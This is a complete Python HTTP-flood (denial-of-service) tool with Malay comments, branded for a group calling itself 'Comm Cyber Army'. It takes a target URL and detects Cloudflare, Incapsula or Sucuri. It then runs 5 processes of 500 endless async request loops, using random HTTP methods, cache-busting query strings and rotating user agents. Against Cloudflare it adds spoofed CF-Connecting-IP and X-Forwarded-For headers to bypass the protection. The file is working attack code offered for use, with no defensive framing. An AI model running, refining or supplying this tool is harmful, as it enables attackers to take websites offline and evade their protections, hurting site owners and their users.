import threading
import aiohttp
import asyncio
import sys
import time
import random
import string
import os
import pyfiglet
from multiprocessing import Process
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

# Bersihkan terminal sebelum mula
os.system("clear" if sys.platform == "linux" else "cls")

# Banner utama
def print_banner():
    border = "=" * 60
    title = pyfiglet.figlet_format("CommCA")
    subtitle = "created by Mod CommCA"
    print(Fore.CYAN + border)
    print(Fore.RED + title)
    print(Fore.YELLOW + subtitle.center(60))
    print(Fore.CYAN + border)
    print(Fore.WHITE + "🚀 Basic Tools | Fast | Powerful | Reliable 🚀".center(60))
    print(Fore.CYAN + border)
    print(Fore.WHITE + "⚡ Greetz: Comm Cyber Army Member ⚡".center(60))
    print(Fore.CYAN + border)

# Fungsi print status dengan warna dan simbol
def print_status(msg, status="info"):
    if status == "success":
        print(Fore.GREEN + "[✓] " + msg)
    elif status == "fail":
        print(Fore.RED + "[✗] " + msg)
    elif status == "warning":
        print(Fore.YELLOW + "[!] " + msg)
    else:
        print(Fore.CYAN + "[*] " + msg)

# Senarai HTTP methods yang digunakan
http_methods = ["GET", "POST", "PUT", "DELETE"]

# Senarai User-Agent yang lebih banyak untuk variasi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-I9500 Build/JDQ39)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)"
]

# Fungsi untuk buat string rawak
def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Fungsi buat URL unik dengan parameter rawak
def random_url(url):
    return f"{url}?random={random_string(10)}"

# Fungsi auto detect WAF
async def detect_waf(session, url):
    try:
        async with session.get(url) as response:
            headers = response.headers
            waf_detected = None

            if "Server" in headers:
                server_header = headers["Server"].lower()
                if any(waf in server_header for waf in ["cloudflare", "incapsula", "sucuri"]):
                    waf_detected = headers["Server"]

            if not waf_detected:
                if "cf-ray" in headers or "cf-cache-status" in headers:
                    waf_detected = "Cloudflare"
                elif "x-iinfo" in headers:
                    waf_detected = "Incapsula"

            if waf_detected:
                print_status(f"WAF Dikesan: {waf_detected}", "warning")
                return waf_detected
            else:
                print_status("Tiada WAF dikesan.", "success")
                return None
    except Exception as e:
        print_status(f"Ralat semasa mengesan WAF: {e}", "warning")
        return None

# Fungsi utama serangan dengan bypass WAF dan random delay
async def fetch(session, url, waf_detected):
    start_time = time.time()
    while True:
        try:
            method = random.choice(http_methods)  # Pilih method rawak
            target_url = random_url(url)
            delay = random.uniform(0.1, 1.5)  # Random delay (0.1s - 1.5s)

            # Header manipulasi jika WAF dikesan
            custom_headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": url,
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive"
            }

            # Tambah header khas untuk bypass Cloudflare
            if waf_detected == "Cloudflare":
                ip_part1 = random.randint(1, 255)
                ip_part2 = random.randint(0, 255)
                ip_part3 = random.randint(0, 255)
                ip_part4 = random.randint(1, 255)
                random_ip = f"{ip_part1}.{ip_part2}.{ip_part3}.{ip_part4}"
                custom_headers["CF-Connecting-IP"] = random_ip
                custom_headers["X-Forwarded-For"] = random_ip

            data = {"random_data": random_string(20)} if method in ["POST", "PUT"] else None

            # Retry mechanism up to 3 attempts
            for attempt in range(3):
                try:
                    async with session.request(method, target_url, headers=custom_headers, data=data) as response:
                        elapsed_time = round(time.time() - start_time, 2)
                        if response.status == 200:
                            print_status(f"Berjaya Mengetuk Server: {elapsed_time}s | Method: {method} | Status: {response.status}", "success")
                        else:
                            print_status(f"Gagal: {elapsed_time}s | Method: {method} | Status: {response.status}", "fail")
                        break
                except aiohttp.ClientError as e:
                    if attempt == 2:
                        print_status(f"Gagal selepas 3 cubaan: {e}", "fail")
                    else:
                        print_status(f"Cubaan ke-{attempt+1} gagal. Mencuba lagi...", "warning")
                        await asyncio.sleep(1)

            await asyncio.sleep(delay)  # Tambah delay rawak supaya nampak lebih realistik

        except Exception as e:
            print_status(f"Ralat Tidak Dijangka: {e}", "warning")
            break

# Fungsi async utama
async def main(url):
    tasks = []
    connector = aiohttp.TCPConnector(
        ssl=False,
        use_dns_cache=False,
        limit=0,
        force_close=False,
        enable_cleanup_closed=True
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        waf_detected = await detect_waf(session, url)  # Auto detect WAF
        for _ in range(500):  # Jumlah tugas async
            tasks.append(fetch(session, url, waf_detected))
        await asyncio.gather(*tasks)

# Jalankan serangan dalam multiprocessing
def start_attack(url):
    while True:
        try:
            asyncio.run(main(url))
        except Exception as e:
            print_status(f"Mengulang Serangan... Ralat: {e}", "fail")

if __name__ == '__main__':
    print_banner()
    url = input(Fore.GREEN + "🔗 Masukkan URL Web -> ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    print_status(f"URL Sasaran: {url}", "success")
    time.sleep(1)

    processes = []
    process_count = 5  # Jumlah proses serentak

    for i in range(process_count):
        p = Process(target=start_attack, args=(url,))
        p.start()
        processes.append(p)
        print_status(f"Proses {i+1} dimulakan...", "info")

    for p in processes:
        p.join()
